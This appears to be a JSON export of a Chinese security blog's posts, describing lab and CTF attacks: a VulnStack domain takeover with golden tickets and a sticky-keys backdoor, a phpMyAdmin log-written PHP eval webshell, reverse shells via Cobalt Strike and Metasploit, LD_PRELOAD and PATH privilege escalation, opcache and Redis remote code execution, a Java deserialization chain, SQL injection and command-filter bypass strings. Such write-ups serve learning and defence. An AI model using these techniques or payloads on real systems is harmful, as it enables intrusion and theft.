这里爆出了SID为500的域管账号(也就是Administrator) 横向移动 201机子还没被扫出来，太神奇了 这边先拿DC，用爆出来的管理员hash横向移动： 这里是拿下DC了，但是PC还是扫不出来。。。？ 这就很离谱 总之拿下DC之后进行权限维持 黄金票据 如图，cobalt strike已经给你准备好了 说到黄金票据那就不得不说Kerberos协议 Kerberos协议其实是windows的一个域认证常用协议 其大致流程如下： 登录：客户端用户A输入用户名密码 认证：系统验证用户A身份 授权：系统授权客户端用户A访问服务S 请求服务：客户端用户A往服务S发送请求 其中参与到的角色有： Client：Application Client应用客户端 AS：Authentication Server 认证服务器，用于认证用户身份 TGS：Ticket-Granting Service 用来授权服务访问 SS：Service Server 用户请求的服务S 打个比方，整个过程就是：你想坐飞机，但是机场告诉你必须有机票（TGT）才可以登机，接着你去购票处（AS）出示身份证（Client name）购买了一张机票（TGT），你拿着机票登机，在检票处（TGS）出示机票，服务人员告诉了你的座位号（Ticket），然后就可以坐到自己的位置上。 黄金票据的大致原理就是伪造krbtgt用户的TGT票据，krbtgt用户是域中的用于管理发放票据的用户，如果拥有了它的权限，就可以伪造系统中的任意用户 前提条件： 已经获得DC的管理员权限 获取到krbtgt用户的hash值 需要的东西： sid krbtgt的密码hash值 当然，logonpasswords之前就已经爆出来了： 然后爆krbtgt的密码hash值，其实就是hashdump(这里要在DC机上爆) 在web机生成黄金票据 在web机查看域控的C盘 看一下扫不出来的PC能不能看 然并卵 拿到黄金票据之后还可以进一步操作，生成一个影子域管理员 粘滞键后门 这个用msfconsole里的post/windows/manager/sticky_keys就行了，但是要有DC的system权限"},{"title":"VulnStack 1","date":"2024-03-20T12:15:36.000Z","url":"/posts/57620.html","tags":[["渗透","/tags/%E6%B8%97%E9%80%8F/"]],"categories":[["undefined",""]],"content":"也是终于做了这个vulnstack靶场的测试了:( 不过市面上还是很多人做了这个的，简单的操作学习一下吧 环境配置 三台机子： 公网机利用phpstudy开启了公网服务，公网访问192.168.64.128 外网 发现的是一个php探针，这里测试一下mysql： 这里用户名密码都是root，连接正常 利用dirsearch收集信息： 发现了phpmyadmin，这里找一下phpmyadmin的漏洞利用 查找有无权限 这里权限是null，无法直接写shell 利用日志写shell： 开启general_log后系统将mysql以后执行的每一条查询语句写入你指定位置的文件夹里： 我这里直接将phpstudy解压到了C盘，所以路径就是C:/WWW/1.php 然后select &quot;&lt;?php eval($_POST['cmd']);?&gt;&quot; 访问一下1.php 我这里第一次翻车了，所以写到2.php 蚁剑连接： 成功拿到shell，这边没有yxcms的路线，所以暂且不和大家写这一条线的 cs上线 上线一下cobalt strike： 这边利用vps创一个teamserver然后cs连接： windows上用cobaltstrike.bat，生成一个powershell的payload： 这样就能生成了 这里填一下自己的vps，然后powershell执行一下： shell弹过来了： 右键，选择会话交互，sleep 0，然后执行命令： 权限提升：需要创建另一个监听器，这边选择开启了6001端口 右键shell凭证提权即可，成功获取到SYSTEM权限的shell： 这里dumphash和logonpassword就出了win7的密码： 横向移动 确认域控： 确认域中的账户： 确认域管： 用psexec打域控： 直接梭了 其实这里我应该也把win7的密码改成HONGRISEC@2019的，让他们的密码一致，毕竟Adminstrator是域管 上线cs： 后面还会有msf的打法，先休息了（ msf打法 这边用msf制作一个shell： msf监听： 然后用蚁剑传上去执行： shell就弹过来了： 这边可以将msf的shell派生给cs： msf派生cs 用2333端口的监听器，然后meterpreter： 注意这里要用ip而不是0.0.0.0，而且要用reverse_http 否则就弹不过来 接下来的流程就和cs的一样了，net view扫内网然后按上面的流程打 这边就不展开，接着用msf打： 这里就不像cs能直接扫到内网的ip了 查的结果很抽象 这里还是先提权： msf可以直接getsystem，exit回到meterpreter，然后直接getsystem 再回shell，已经是system权限了 导出密码： 发现不行： 这里有可能是因为32位的kiwi在64位的机子上运行了 别急，重新起一个x64的windows shell试试： 重新监听之后就好了 这里再额外讲一下meterpreter迁移： meterpreter迁移 其实是将meterpreter迁移到稳定的进程去，防止运行的shell被突然关掉 这里利用ps查询进程 然后getpid查询meterpreter本身的进程号： 接下来找到一个稳定的进程，例如explorer.exe： 输入 刚刚session挂了，重新放一张成功的 成功迁移到了explorer.exe了 横向移动 这边在蚁剑ipconfig找网段： 发现了52网段 传一个fscan，扫一下： 目录下result.txt生成结果： 筛掉这个靶机的.143 另外找到了192.168.52.141和192.168.52.138 建立52段的路由： 看端口情况： 都开了445，用永恒之蓝爆了 这边先开公网服务的3389 meterpreter执行： 添加一下管理员： 远程桌面连一下： 或者 就好了 接下来就是拿永恒之蓝爆剩下的服务 Administrator 拿下 141： 执行失败，不能用64位的 换个方式打： 返回了nt authority\\system，拿下system权限。这里只能一条命令一条命令输入 开3389 fscan看到已经开了3389了，用刚刚公网的连一下： 拿下 同样的操作拿下138的机子： 这边还得关下防火墙： 关掉防火墙之后就可以连上3389了 至此全部拿下"},{"title":"简单看看环境变量劫持","date":"2024-03-07T13:15:31.000Z","url":"/posts/13343.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["undefined",""]],"content":"建立在他人文章基础上的文章，简单看看环境变量带来的提权/劫持 环境变量提权 挺有意思的，也是最近的hgame2024有接触到 PATH是linux系统中的环境变量，指定可执行程序的所有/bin和/sbin目录，并且通过PATH环境变量执行用户的命令(用来搜索可执行文件) 环境变量提权的必要条件是有一个root权限的可执行程序(一般都是c语言编写的)，例如下面的demo(随手写的，不知道对不对): 并且： 就是一个简单的通过setuid(0)，也就是root，来执行ls命令 调用这个可执行程序来执行的ls是以root权限来执行的 拿到shell之后用find查一下就好了（ 此时执行这个test就是ls 提权方法 本质都是将/bin/sh或者/bin/bash添加进一个执行命令的同名的程序(比如上面的demo是ls，那就添加进ls)里，然后环境变量添加自己的path，然后执行这个shell，此时ls就会执行到我们添加的环境变量的ls程序(记得给777) echo法: cp法 软链接法 执行时test会去调用ls，它先去环境变量中找到了/tmp目录下的ls，结果一执行就执行了/bin/bash，获取到了root权限 例题 详见hgame2024的Reverse and Escalation II 同样的方式反弹shell后 这个题只需要打开ida然后查看伪代码就知道： 抛开随机数这一关，本质上就是用root权限执行ls 直接用上面的方式做一遍就好了。 环境变量劫持 ld_preload环境变量劫持 详细的文章可以看 LD_PRELOAD劫持_unset ld_preload-CSDN博客 ld_preload其实是linux下的一个环境变量，用于动态链接库的加载。 它的优先级在动态链接库中是最高的，类似于.user.ini里的auto_prepend_file 链接：编译器找到程序中所引用的函数或全局变量所存在的位置 静态链接：在程序运行之前就把各个模块以及所需要的库函数连接成一个可执行程序，之后不再拆开 装入时动态链接：源程序编译后得到的一组模块，在装入内存时边装入变链接 运行时动态链接：源程序编译后得到的模块，在执行的时候才对他进行动态链接 简单的说动态链接在编译的时候并没有编译到可执行文件中，只在执行的时候动态加载库中的函数 ld_preload用于linux中动态链接库的环境变量，它允许你定义在程序中运行之前优先加载的动态链接库。此时我们就可以自定义动态链接库内装入恶意函数。此时称ld_preload劫持 如果我们写的.so有一个恶意构造的函数和我们指令执行的函数一样，而ld_preload指向这个.so文件，此时执行指令的时候就会优先调用恶意文件覆盖的那个函数 .so就是动态链接库的文件名，相当于windows的dll文件 export LD_PRELOAD=***能够修改LD_PRELOAD的指向 自己测试的时候记得还原 unset LD_PRELOAD 例子 例如一个c语言代码： 此处生成了10个随机数，为random.c gcc编译： 执行 写了一个urandom.c，覆盖了random.c里的rand()函数 用下面的方式编译成.so文件 此时再执行一次random： 他就会返回的都是我们urandom设定好的666 利用ldd命令可以查看可执行文件加载的动态库优先顺序： 可以看到如果我们指定了LD_PRELOAD=urandom.so，使用ldd时可以看到所加载的so有我们自己实现的urandom.so，由于加载顺序最高，所以优先使用urandom.so中的rand函数(libc.so.6是默认的动态链接库) 利用(已过时) 其实linux的命令，例如ls这些在背后运行了许多函数，如果我们用ld_preload劫持了其中一个函数，就会引发危险 例如ls命令 通过readelf查询ls使用了什么函数： 选取其中之一重写，例如strcpy(line 13)和strncmp(line 10) 踩坑strcpy 这边选取strcpy 如果不知道strcpy的参数格式可以先编译一次，然后查看报错信息： 发现不行，不显示，然后发现clear用不了了： 神秘原因，clear也没调用strcpy啊 换strncmp 同样的情况。。 换成system strncmp居然可以了，而strcpy不行： 真的神秘 猜测是exit的原因…? 还有一点要注意的就是不要写return 0 利用(新版) 主要是不知道为什么不能够用readelf了，不准确 这里用ltrace读就好了 重写fflush即可 使用ld_preload绕过disable_function 这个老生常谈了 步骤： 查看进程调用的系统函数明细 找寻内部可以启动新进程的php函数 找到这个新进程调用的系统库函数并且重写 PHP环境下劫持系统函数 例如常见的mail函数: 利用mail()启动新进程劫持系统 分析一下mail调用了什么： 一个简单的php： 利用strace跟踪系统调用： 查看它会调用什么系统函数，比如/bin/sh，比如这个sendmail 由于kali里没有sendmail，这里便直说是调用了getuid()函数了 直接构造一个getuid.c，并且payload执行id命令： 注意这里id要用双引号包裹，我这边打错了，后面改正了 如果说命令没找到的，可以apt install一下 error_log() 同样地，error_log也可以这么干，同样调用了getuid 利用ld_preload劫持新进程 我们劫持getuid是因为前面这些函数调用了getuid，但是实际程序上如果禁用了sendmail，或者根本没有安装sendmail的话就根本劫持不了 所以另一个方法就是 系统通过ld_preload预先加载动态链接库，然后加载时就执行代码，这样就不用考虑要劫持什么函数了 gcc中有一个c语言拓展修饰符__attribute__((__constructor__))，可以让他修饰的函数再main()之前执行，若他出现在动态链接库中，一旦被加载，就会立刻执行被这个修饰的函数。这样一旦任意新建任意进程，就会立即被rce example: 编译成so，LD_PRELOAD添加路径： 无论执行什么命令，都会执行id命令 项目文件预览 - bypass_disablefunc_via_LD_PRELOAD - GitCode CTF例题 [UUCTF 2022 新生赛] uploadandinject nssctf平台 上传文件，提示hint.php 下载.index.php.swp 通过vim恢复(当然可以使用其他恢复工具) 一眼漏洞，只需要上传一个.so然后劫持就好了 ps：不一定需要.so后缀 这里要检查它调用了什么函数，关键在于这个system(&quot;echo Success to load&quot;); 用strace看一下 emmm，只有一个/bin/sh 这个时候追踪一下/bin/sh 发现了strcpy 写一个exp.c 剩下就是找上传路径 试一下发现在/upload/upload.php 无其他限制，直接改后缀就能传 直接把我们的路径加载上去，就getshell咯： 偷一下上传文件模板，欸嘿 如果后续有的话还会慢慢补充的，放心"},{"title":"opcache缓存getshell学习","date":"2024-02-12T03:26:54.000Z","url":"/posts/57128.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"学习opcache缓存getshell： 环境搭建 需要： 一些踩坑 我在kali-linux(或者是wsl)上部署的php8.2.1版本的opcache，中间踩了挺多的坑，在这里记录一下： docker： 这里直接pull可能会说cannot connect to the Docker daemon，此时终端输入dockerd即可 创建容器： exec： 此时我们的php并没有开启opcache拓展 我们要通过exec进入到docker里的/usr/local/etc/php 里面有两个php.ini，分别是php.ini-development和php.ini-production 将php.ini-production重命名为php.ini，然后用vim编辑php.ini 就是这一步重命名花了我好久时间排查问题，最后重命名就解决了，无语 这里可能会说没有vim，此时需要安装： 编辑之后按打开opcache的常规方式编辑php.ini即可 接下来为了方便测试，我这里在docker内写了一个index.php和phpinfo.php，作用分别是一个shell和一个phpinfo的作用 打开google-chrome： 这里如果利用root权限打不开谷歌浏览器，可以： 关于 ERROR:zygote_host_impl_linux.cc(90)] Running as root without --no-sandbox is not supported 按照上面贴出的链接进行修复 之后访问127.0.0.1:port/phpinfo.php查看phpinfo的opcache是否打开了 打开成功，此时访问index.php，在你设置好的cache文件夹下就会生成一个/system_id/var/www/html/index.php.bin了 将docker内的index.php.bin复制到windows 由于是wsl，所以这里稍微麻烦一些。 wsl将windows的磁盘挂载在/mnt下，所以只需要把文件复制到/mnt/d里(也就是d盘)： 此时d盘就会有我们的index.php.bin了 至此，我们的准备工作：生成shell的bin文件、将bin文件带出到我们的windows系统就正式完成了 原理 在opcache的机制下，有bin文件会直接执行bin文件，如果配合上传漏洞可以将bin写到指定目录，然后访问相应的php文件达到getshell的目的 条件： 需要打开opcache并且以文件形式储存 可文件上传覆盖 可以计算system_id（利用phpinfo） 需要计算时间戳(filectime 或者其他的方法)，这是因为opcache.validate_timestamps的配置默认为1，这是为安全性而考虑的。而bin文件在创建的时候会在文件内容中写入一个时间戳。这个时间戳给你源文件一样。在执行bin文件前php会先检查时间戳是否一致，如果不一致则丢弃并重新创建一个bin文件 system_id的计算 php7情况下利用脚本： 可以看出其实system_id的逻辑就是 其实extension_id就是： bin_id根据32位系统还是64位系统而定 x86: BIN_48888 x64: BIN_44444 当然这是php&gt;7.4的情况，小于的自行去看脚本 php8情况下在上面的基础上，extension_id修改为： 这里贴一下boogipop师傅的帖子： [PHP8 OPCACHE缓存文件导致RCE - Boogiepop Doesn’t Laugh (boogipop.com)]( OPCACHE缓存文件导致RCE/) 其实这里还有个不算技巧的技巧，如果你的docker里的php版本、构建等和靶机的一致，其system_id也是一致的，如： 上图是我docker内的systemid 下图是dasctf x 0psu3里single_php的system_id 计算完system_id之后的操作就是简单的文件上传，即可getshell 这里两个题都是利用压缩文件解压到tmp目录导致opcache缓存文件的执行：(single_php和春秋杯2023 php_again，一个是tar文件，另一个是zip) 获取时间戳 php函数filectime 或者是获得php框架里的文件的修改时间(php_again里通过打包www.zip然后读取获得时间戳) 后续操作 利用010打开bin文件，修改system_id和时间戳使得修改后的bin与靶机的system_id和时间戳一致(010修改时间戳在0040h处) 之后需要根据题目将/system_id/var/www/html/index.php.bin上传或者压缩后再上传，等待解压后就可以getshell了 题目 dasctf x 0psu3 single_php 这题当时做了一下，但是卡住了 当时首先是title没看到siranai.php 后面看到这个php的操作的时候还以为是需要上传tar来打软链接，然后又找要上传的点 看phpinfo发现了soapclient，觉得可以尝试利用soapclient打一个tar软链接过去 发现不会打soapclient… 然后就没管了 后面wp出来的时候发现对了一半，另一半就是利用opcache打一个bin过去rce 这里复现一下 这边通过之前的操作可以得到index.php.bin 然后利用filectime函数获取到时间戳： 010处修改时间戳： 根据上面的systemid计算方法计算出systemid(这里其实就是我们docker搭的system_id) 利用脚本生成tar文件： post这个tar过去，获取到其请求体，content-length等信息，便于我们后续打soap client： 最后打个soapclient就好了 要解释一下的就是这里要用127.0.0.1访问打ssrf 还有就是$b-&gt;koi = [&quot;zhanjiangdiyishenqing&quot;=&gt;[$a, &quot;nnnn&quot;]]; 在序列化反序列化里，这样会调用到$a的nnnn方法，而$a是soapclient 但是soapclient并不存在nnnn方法，此时会触发__call，正好soapclient就是利用call方法发报文的，此时我们将请求发过去，然后刷新一下页面，就已经是我们的shell了： 春秋杯2023 php_again 大同小异的操作，只不过变成了zip，而且利用www.zip获取到时间戳 "},{"title":"java反序列化 CC1","date":"2024-02-02T04:31:55.000Z","url":"/posts/26875.html","tags":[["Java","/tags/Java/"]],"categories":[["Java","/categories/Java/"]],"content":"java comon collections反序列化的第一条链 cc1 CC1 java反序列化CommonsCollections手写exp CC1链，可以看白日梦组长大佬的视频，讲得很详细，多看几遍肯定能看懂 前置知识 众所周知(?)，java的反序列化是建立在反序列化时自动执行readObject方法的，所以我们只需要找到能够执行恶意代码的方法，然后倒推回有readObject入口类的方法(前提当然是他们都是实现serializable的，如果没有，要用反射获取) 版本问题 java版本：jdk 8u65 Common Collections版本：3.2.1 这里的java版本8u65在oracle下载的时候发现是8u111… 无语，在这里用编程宝库的8u65下载即可 其他问题 调试问题 有些包内是没有源码的，我们能看到的是.class文件反编译后的结果，会导致我们调试的时候很难看，而且不能够直接查找 就比如 需要我们自己添加java源码来重新调试 这里从jdk: af660750b2f4 (openjdk.org)下载一个合适版本的源码 安装8u65之后安装目录下会有一个src.zip，将其解压 可以看到源码中是没有sun的，所以我们要在上面的openjdk.org中下载一个 将sun复制到src文件夹中 再在idea的project structure中添加sdk 其实，download source也可以直接下载下源码来查看 开搓CC1 CC1的入口类 CC1链的入口类是在一个Transformer当中 transform接受一个Object对象，然后对对象进行操作并且返回一个transform后的对象 跟进其实现类(ctrl+alt+b)，可以详细地观察如何实现 例如ConstantTransformer 该Transformer无论你传入的什么对象它都会返回一个iConstant常量 跟进该常量 可以知道iConstant是由其构造函数定义的 再例如ChainedTransformer： 这个transformer会根据传入的iTransformer数组来进行链式反应： 相当于下一个transform的参数是上一个的值(前一个输出是后一个的输入)，比如数组是1 2那他的返回就是2.transform(1) 我们的漏洞点在InvokerTransformer里： 很明显的看到他是反射调用传进来的object，然后获取其方法再invoke调用，iMethodName就是函数的名字，iParamTypes就是参数的类型，iArgs就是参数 往上看可以得知构造函数中这几个就是我们传入的值： 也就是说我们可以利用InvokerTransformer调用任意代码 一个简单的弹计算器方法： 我们将其修改成利用InvokerTransformer调用从而弹计算器，先修改成利用反射弹计算器： 我们可以看到InvokerTransformer调用的时候需要传入参数名、参数类型、参数值： 可以看到传入的参数类型和值都是数组类型，然后调用这个对象的方法 所以我们也这么传入： 第一个是方法名，肯定是我们的exec 第二个是参数类型，我们的参数类型是String，所以填入的是String.class 第三个参数就是我们的参数值，calc 所以我们是这么写的： 这样便利用InvokerTransformer弹了计算器 往上找调用 继续往回找不同名方法调用transform，利用find usage查找。 在Map类中的TransformedMap.java内调用了transform方法 可以看到这两个方法都调用到了key(value)Transformer.transform(object) 还有一个CheckSetValue也会调用valueTransformer.transform 这里锁定checkSetValue方法 其构造函数也是传入了一个Map，两个Transformer，但是是一个protected方法 往上找到decorate方法，decorate方法返回的就是这个东西 而且他是一个public static方法，所以我们可以直接通过类名调用这个decorate方法 尝试利用TransformedMap的decorate方法触发InvokerTransformer的transform方法： 需要一个Map，这里利用hashMap 接下来寻找如何触发这个checkSetValue方法： 找到了一个AbstractInputCheckedMapDecorator.java中利用setValue调用了parent.checkValue(value)，这个类还是这个TransformedMap的父类 entry的意思是键值对() 比如map.put(&quot;key&quot;, &quot;value&quot;); 此时如果要遍历的话可以写成Map.entry:map.entrySet() 也就是说其实这个setValue是一个map里面的方法，然后将其重写了 如果我们将这个decorate放进map，此时我们调用map的setValue方法就会调用到TransformedMap.setValue，再找回父类的setValue调用 然后调用到checkSetValue再到InvokerTransformer.transform 注意一下最后它是通过value调用transform方法，所以我们要将value设置成runtime.getRuntime()对象，而且这个hashMap必须是非空的： 此时相当于我们调用了 TransformedMap里面的setvalue，但是它调用到父类的setValue然后跟着去调用到了checkSetValue(r)再进入到了InvokerTransformer.transformer方法 成功弹出计算器 继续往回找符合Entry遍历并且调用setValue方法的方法，并且最好是回到入口的readObject 此时找到了AnnotationInvocationHandler内的readObject利用了该方法 跟进发现完全符合我们要求： 其中这个memberValues是我们可控的 看看其构造函数： 里一个Class类型，一个Map类型 其中Class类型是需要继承Annotation的 Annotation其实就是我们平时经常写的那种@Override那样的注解 但是这个类有点不好的在于这个类并不是public class 所以我们还需要利用反射获取这个类： 这里看似已经成功了 但是有3个问题： 仔细想想就知道我们setValue的时候需要传入那个runtime对象，但是这里似乎是被限制了： Runtime没有实现Serializable，所以我们还需要利用反射获取到runtime readObject还需要满足两个if条件才能到setValue： 反射获取runtime 接下来我们修改一下获得Runtime： 此时我们再利用invokerTransformer来执行这几个： 仔细想一下InvokerTransformer的transform方法 是通过传入的Object来获取其反射，然后根据传入的方法名、参数类型、参数来执行该方法(a.b(参数)) 首先利用InvokerTransformer实现getRuntime 就是利用getMethod来实现的，所以我们去查看一下getMethod的参数类型： 一个String，一个Class数组 InvokerTransformer的Object数组填的是参数，这里其实就是getRuntime，getRuntime的参数是null 那就可以写出： 接下来实现invoke 理解这个transform(a)其实就是a. b(参数)的时候就很容易写了 invoke是一个Object，一个Object数组，而且我们的两个参数都是null 此时我们就获得了Runtime r 接下来获取exec 至此，利用java反射获取runtime并且执行exec就完成了： 利用ChainedTransformer 可以看到这三行总是利用前一个的值作为后一个transform方法的参数 所以我们利用ChainedTransformer进行简化 查看ChainedTransformer的方法 只需要传入Object就可以了，这个Object就是我们方法的开始，也就是Runtime.class 简化后变成： 补全并解决其他的问题 重新往下走，补全之前的TransformedMap： 发现其实还是不能够成功 这里debug一下，先看一下是不是没进到if 可以看到Map里面是key=&gt;value getKey之后是key 但是memberType里面却是null，导致我们进入不了if 往回看memberType是个什么东西： 是一个叫MemberTypes的Map根据getKey之后获取的名字来获取到的结果 往回跟memberTypes 发现他是一个AnnotationType.getInstance(type) 也就是它会根据注解的类型来获取到它的成员变量/方法 我们写的注解是Override，看一下Override Override是没有成员变量/方法的 所以我们改一下，改成有的： 比如Target就有一个 我们改成Target.class 此时还需要满足根据Map的key来查找它 所以将Map的key值改成value 再debug一下发现已经不是null了 然后进入到第二个if: 这个isInstance的意思就是判断对象是否是参数本身或者父类 也就是memberType是否是value本身或者父类 我们的value传的是aaa，所以肯定不是memberType的本身或者父类 直接进入到下面的setValue 跟进发现问题： 我们传入的Object是一个Proxy 也就是setValue那的一个不可控的东西，导致我们失败 此时该怎么办呢 办法是有的，那就是ConstantTransformer ConstantTransformer无论传入什么返回的都是一个常量 我们可以利用它传入一个Proxy，返回的常量就是我们的Runtime.class 只需要在ChainedTransformer数组里的第一项添加即可 构造方法如上 很简单，只需要将Transformer数组修改成： 终于完成： 总结 这条链子通过 最终导致任意方法执行 与ysoserial有些不同，ysoserial的中间是利用了lazymap的 payload: "},{"title":"Redis","date":"2023-11-27T11:14:03.000Z","url":"/posts/27273.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"看看redis的一些东西 Redis Redis未授权访问 在另一台机子上安装redis服务 然后直接进入到src目录下redis-cli -h 另一台机子的ip -p 6379直接连上 备份crontab 反弹shell (CentOS有效，因为redis写文件默认为644，在ubuntu下要600) 条件： redis服务使用root启动 Redis未授权访问或者授权口令已知 如果是较高版本的Redis，还得关闭配置保护模式在etc/redis.conf 这里利用gopherus生成redis的payload，利用ssrf打一下： 发现有6379端口的redis服务(?url=http://内网:6379) 利用gopherus生成反弹shellpayload： 二次urlencode: 备份文件写马 条件： web目录有写权限 平时用gopherus也能生成webshell 写入sshkey 利用条件： redis服务使用root启动 服务器开启了ssh服务 先生成公钥： 写入 为了写入方便，也能这么写： 通过Redis未授权写入： redis主从复制rce 条件： 未授权访问或者授权口令已知 4.x &lt;= Redis &lt;= 5.0.5 背景： Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。 为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 Redis拓展模块 在redis 4.x之后，Redis新增了模块功能，通过外部拓展可以实现在redis中实现一个新的redis命令，通过c语言编译出.so文件 怎么打主从复制： 生成payload的脚本 点名批评buu，怎么打都不能连上我的vps 转战nssctf，直接成功了… 但是反弹shell不行，？ vps上起一个服务python3 redis-rogue-server.py --server-only --lport 2333(不指定lport默认21000) 然后分三次打 这里分三次是防止还没复制好就到下一步导致主从复制失败： 每一次改一下上面那个脚本的cmd部分 打之前开好redis-rogue-server.py 第一次： 记得二次urlencode 如果打成功了会有： 第二次： 要是有三个+OK，那说明你打成功了 第三次： 获取flag 反弹不了shell大不了多打几次Redis redis中exp.so的简单分析 在redis-rogue-server上有exp.c和redismodule.h exp.c是这样的，而RedisModule.h是一些Redis服务的宏定义 中间有三个函数： Docommand应该是接受我们的命令并且执行(正向exec) RevShellCommand应该是一个反弹shell到我们的主Redis服务上(rogue server) On_Load应该是将exp.so上传到Redis服务器的时候进行的初始化加载操作 可以看到在OnLoad上就有我们的三个过程： "},{"title":"二次校验","date":"2023-11-27T11:10:37.000Z","url":"/posts/28032.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"二次校验，又或者是有关quine的东西 二次校验 其实就是quine： 前端登录的时候： 经过sql处理后的语句等于登录前post的内容就视为登录成功： 利用replace: 脚本： processlist： 查询当前执行sql语句： 利用： "},{"title":"groupby + rand报错注入","date":"2023-11-27T11:09:12.000Z","url":"/posts/36166.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"利用groupby + rand的特性进行报错注入 rand() rand()中可添加参数作为随机种子，一边为时间 如果种子是固定的，产生的随机数也是固定的 floor() 向下取整 这样会使得floor(rand(0)*2)的值固定： group by group by 会对相同的内容进行分组，然后再进行排序： count(*)能够进行计数： 例如: 此时： 此时count(*)就是对每个分数的人计数 rand + floor + group by 注入 利用： 原理分析： 建表： key count 此时执行floor(rand(0)*2)，发现结果是0，查表发现没有0，于是再计算一次floor(rand(0)*2)，然后将结果1写入表中： key count 1 1 然后再次计算，算得是1，此时发现有key，计数器+1，此时变成了： key count 1 2 然后再次计算，算得为0，发现没有数据；然后再次计算，算得为1，此时再次计算后需要插入新数值，但是key=1此时已经存在了，所以此时就会报错 payload： 爆库： 或者: 反正没有group_concat就用limit 爆表： 爆列，只需将上面的table_name改为column_name information_schema.tables改为columns 爆内容： 注意，因为该语句将输出字符长度限制为了64个字符，所以这里利用limit代替group_concat"},{"title":"mssql注入","date":"2023-11-27T11:07:51.000Z","url":"/posts/62892.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"看看mssql的一些特性： mssql 判断是否为mssql 查表： 特有函数： mssql的注释： 查询信息 mssql版本： 主机名： hostname： 用户名： 查询权限： sql注入： 或者使用NULL： 爆库： 查其他库： 查所有库： 爆表： 爆列： 或者先查表id： 根据表id查内容： 爆内容： 报错注入 由于mssql是强类型数据库，一旦数据类型不匹配就会报错，利用整形和字符之间数据进行运算产生报错： 盲注 bool： time: 判断表名： "},{"title":"pgsql注入","date":"2023-11-27T10:56:20.000Z","url":"/posts/55683.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"pgsql注入的一些方式 pgsql注入 pgsql，全称PostgreSQL，是一个功能强大的开源对象关系型数据库系统，他使用和拓展了SQL语言，是目前功能最强大的开源数据库 基本操作 查看版本： 查看当前用户： 查看配置名： 查看当前库： 查看schema： 查看表： 查看非系统表 注释： limit offset： 联合查询 同样地，判断是否存在注入点都可以利用 判断是否为pgsql： 判断列数还是利用order by 判断回显： 获取当前数据库： 获取所有数据库： string_agg()，将查询到的数据用符号拼接起来 Datname：数据库的名字 pg_database: 存储着所有的数据库名 获取表名： 查column： 查内容： 报错注入 利用CAST： 爆库： 爆表： 爆列名： 数据： pgsql中，可以利用||连接： 布尔盲注 时间盲注 只需要利用pg_sleep替代Mysql的sleep即可： 堆叠注入 同mysql 文件操作 列目录： 读文件： 写文件： 命令执行 udf提权 GitHub - sqlmapproject/udfhack: Database takeover UDF repository"},{"title":"rce(下)","date":"2023-11-08T05:31:20.000Z","url":"/posts/62381.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"由于篇幅有点长 字数有限制:( 分两篇发： Linux命令执行 Linux内的bash有如下的特性： 单引号、双引号、反引号 linux中的单引号相当于原样输出 双引号将变量的值输出 反引号把变量当作命令执行 分隔指令 指令的执行 反弹shell 当然，更加稳定的： 记得开启监听 记得开启http服务 nc反弹 利用ip转int绕过限制 无回显rce 一个反弹shell的payload: 可以写文件到新的文件并读取、改文件名、移动、压缩、甚至将flag外带、反弹shell等 或者利用tee curl 例如flag是以图片形式储存的： dnslog外带 利用sed将base64拼在dns域名 绕过 预操作 空格： 环境变量拼接 ctfshow web 118： 指令 结果 解释 $&#123;PATH%/*&#125; 我的vps: a(见下文) %删除右边的字符，故%/*删除从右往左数第一个/及其右边的所有字符 $&#123;PATH##*/&#125; 我的vps: bin ##删除左边的字符，故##*/代表删除从右往左数第一个及其左边的所有字符 $&#123;PATH:0-10&#125; /sbin:/bin 从右往左截取10个长度的字符，相当于${PATH:~9} $&#123;PATH:0-10:5&#125; /sbin 从右往左截取10个字符，并且从截取的10个字符中选取出前5个 $&#123;PATH%%n*&#125; /usr/local/sbi %%删除右边的字符，但是%%n*是删除从左到右的第一个n及其之后的字符 $&#123;PATH#n*&#125; b* #是删除左边的字符，但是#是删除从左往右第一个n左边的字符 非常重要：由于$&#123;PWD&#125;返回的是当前的目录，所以利用cd ..一直返回上级目录即可获取到/ 示例： a* : /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin: b*::/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #与%%相对应，是从左往右开始截取第一个遇到的及其之前/之后的字符 %与##相对应，是从右往左开始截取第一个及其之后/之前遇到的字符 利用nl： $&#123;PWD:~A&#125;会返回l $&#123;PATH:$&#123;~A&#125;&#125;会返回n 此时能组成nl： $&#123;PATH:$&#123;~A&#125;&#125;$&#123;PWD:~A&#125;$&#123;IFS&#125;????.??? nl flag.php 利用base64： /bin/base64 flag.php 